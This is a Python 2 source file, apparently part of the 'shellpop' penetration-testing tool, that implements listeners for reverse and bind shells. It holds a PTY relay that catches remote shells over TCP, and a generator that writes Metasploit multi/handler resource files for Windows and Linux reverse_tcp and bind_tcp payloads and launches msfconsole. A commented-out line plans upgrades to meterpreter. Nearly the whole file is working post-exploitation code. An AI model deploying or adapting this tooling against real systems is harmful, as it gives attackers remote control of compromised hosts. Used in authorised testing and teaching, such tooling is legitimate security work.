#!/usr/bin/env python2
# Full stager remake. Now I am going to lead a major change in this functionality.
# I am going to lendo multi/handler module of Metasploit Framework to do this job.
# This is going to be done mostly because of meterpreter upgrade possibility.

from shellpop import *
from time import sleep
import termios
import select
import socket
import os
import fcntl
import string
import random
from os import path, system

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty  = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class TCP_PTY_Handler(object):
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind is True:
            print(info("Waiting for connections ..."))
            sock, addr = self.sock.accept()
            print(info("Connection inbound from {0}:{1}".format(self.addr[0], self.addr[1])))
        else:
            sock = socket.socket()
            print(info("Waiting up to 10 seconds to start establishing the connection ..."))
            sleep(10)

            print(info("Connecting to remote endpoint ..."))
            n = 0
            while n < 10:
                try:
                    sock.connect(addr)
                    print(info("Connection to remote endpoint established."))
                    break
                except socket.error:
                    print(error("Connection could not be established."))
                    n += 1
                    sleep(5)


        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [ [ sock, [] ], [ pty, [] ] ]
        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [ sock, pty ]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def error(err):
    return "[\033[091m!\033[0m] Error: {0}".format(err)


def random_file(n=10):
    """
    Generates a random rc file in /tmp/folder.
    """
    file_name = str()
    while len(file_name) < n:
        chosen = list(string.letters)[random.randint(1, len(string.letters))-1]
        file_name += chosen
    return "/tmp/" + file_name + ".rc"


class MetaHandler(object):
    def __init__(self):
        self.host = None
        self.port = None
        self.shell = None
        self.payload = None

    def check_system(self, is_bind=False):
        if self.shell.lower() == "cmd":
            if is_bind is False:
                self.payload = "windows/shell_reverse_tcp"
            else:
                self.payload = "windows/shell_bind_tcp"
            return
        elif self.shell.lower() == "powershell":
            if is_bind is False:
                self.payload = "windows/shell_reverse_tcp"
            else:
                self.payload = "windows/shell_bind_tcp"
            return
        elif self.shell.lower() == "bash":
            if is_bind is False:
                self.payload = "linux/x86/shell_reverse_tcp"
            else:
                self.payload = "linux/x86/shell_bind_tcp"
            return
        self.payload = "generic/shell_reverse_tcp"


class Generic(MetaHandler):
    def __init__(self, conn, shell, is_bind=False):
        self.file_name = random_file()
        self.host = conn[0]
        self.port = conn[1]
        self.shell = shell
        self.check_system(is_bind=is_bind)  # sets self.payload

    def generate_rc_content(self, meterpreter=False):
        """
        Generate a rc content to be used in metasploit.
        """

        # This sets the basic information to our handler module.
        base_rc = "set SessionLogging true\nset TimestampOutput true\nset VERBOSE true\n use exploit/multi/handler\nset PAYLOAD {0}\nset LHOST {1}\nset LPORT {2}\n".format(self.payload, self.host, self.port)

        #  This is not yet implemented.
        #if meterpreter is True:  # Haha! Lets upgrade this!
        #    base_rc += "set AutoRunScript post/multi/manage/shell_to_meterpreter\n"

        # After everything is set, we need to finish it with "run"
        base_rc += "run\n"

        return base_rc

    def _generate_execution_string(self):
        return "msfconsole -q -r {0}".format(self.file_name)

    def generate_and_execute(self, meterpreter=False):
        if path.exists(self.file_name):
            print(error("File already exists! Aborting :("))
            return None
        with open(self.file_name, "wb") as f:
            f.write(self.generate_rc_content(meterpreter=meterpreter))

        # Execute our .rc file to open metasploit handler.
        system("""xterm  -fn "-misc-fixed-medium-r-normal--18-*-*-*-*-*-iso8859-15" +sb -geometry 100x25+0+0 -e """ + self._generate_execution_string())


def get_shell_name(shell_obj):
    """
    This ridiculously simple function is enough to determine
    the receiving shell type for meterpreter upgrade.
    """
    if shell_obj.system_os == "linux":
        return "bash"
    if shell_obj.system_os == "windows":
        if "powershell" in shell_obj.short_name:
            return "powershell"
        else:
            return "cmd"


def reverse_tcp_handler((args, shell)):
    shell_name = get_shell_name(shell)
    handler = Generic((args.host, args.port), shell_name, is_bind=False)
    handler.generate_and_execute()


def bind_tcp_handler((args, shell)):
    shell_name = get_shell_name(shell)
    handler = Generic((args.host, args.port), shell_name, is_bind=True)
    handler.generate_and_execute()


# I am keeping these handlers because of @Lowfuel

def bind_tcp_pty_handler((args, shell)):
    handler = TCP_PTY_Handler((args.host, args.port), bind=False)
    handler.handle()


def reverse_tcp_pty_handler((args, shell)):
    handler = TCP_PTY_Handler((args.host, args.port), bind=True)
    handler.handle()
